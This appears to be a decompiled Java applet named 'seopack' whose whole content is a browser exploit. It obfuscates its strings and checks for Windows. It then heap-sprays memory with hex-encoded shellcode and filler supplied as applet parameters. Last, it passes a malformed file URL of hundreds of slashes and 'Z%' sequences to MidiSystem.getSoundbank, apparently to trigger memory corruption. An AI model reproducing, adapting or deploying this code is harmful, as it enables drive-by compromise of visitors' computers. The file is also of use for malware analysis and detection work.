import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class seopack extends Applet
{
    private IntBuffer[] __b;
    
    @Override
    public void init() {
        String s = "";
        final char c = '\u012e';
        s = repeat('/', c);
        final String s2 = System.getProperty("musoromusorsmusor.musornmusoramusormmusore".replace("musor", "")).toLowerCase();
        if (s2.indexOf("musorwmusorimusornmusor".replace("musor", "")) < 0) {
            return;
        }
        s = repeat('/', 302);
        s = "musorfmusorimusorlmusoremusor:musor/musor/musor".replace("musor", "") + s + "musorZmusor%musorZmusor%musorZmusor%musorZmusor%musorZmusor%musorZmusor%musor".replace("musor", "");
        try {
            this.__b = this.__w(this.getParameter("musormusorsmusormusorcmusor".replace("musor", "")), this.getParameter("musornmusorpmusor".replace("musor", "")));
            MidiSystem.getSoundbank(new URL(s));
            final long l = 10L;
            while (true) {
                Thread.sleep(l);
            }
        }
        catch (Exception exception) {}
    }
    
    public static String repeat(final char c, final int i) {
        String s = "";
        for (int j = 0; j < i; ++j) {
            s += c;
        }
        return s;
    }
    
    public static short[] _Z(final String s) {
        final short[] aword0 = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            final char c = s.charAt(i);
            final char c2 = s.charAt(i + 1);
            int j = Character.digit(c, 16) & 0xFF;
            j <<= 4;
            j += (Character.digit(c2, 16) & 0xFF);
            aword0[i / 2] = (short)j;
        }
        return aword0;
    }
    
    public final IntBuffer[] __w(final String s, final String s1) {
        final short[] aword0 = _Z(s);
        final short[] aword2 = _Z(s1);
        return this.__w(aword0, aword2);
    }
    
    public final IntBuffer[] __w(final short[] aword0, final short[] aword1) {
        final byte byte0 = 50;
        final int i = 1048576;
        final int j = i / 4 - aword0.length;
        final IntBuffer[] aintbuffer = new IntBuffer[byte0];
        for (int k = 0; k < byte0; ++k) {
            final IntBuffer intbuffer = IntBuffer.allocate(i / 4);
            for (int l = 0; l < j; ++l) {
                intbuffer.put(aword1[0] | aword1[1] << 8 | aword1[2] << 16 | aword1[3] << 24);
            }
            int i2 = 0;
            while (i2 < aword0.length) {
                intbuffer.put(aword0[i2++] | aword0[i2++] << 8 | aword0[i2++] << 16 | aword0[i2++] << 24);
            }
            aintbuffer[k] = intbuffer;
        }
        return aintbuffer;
    }
}
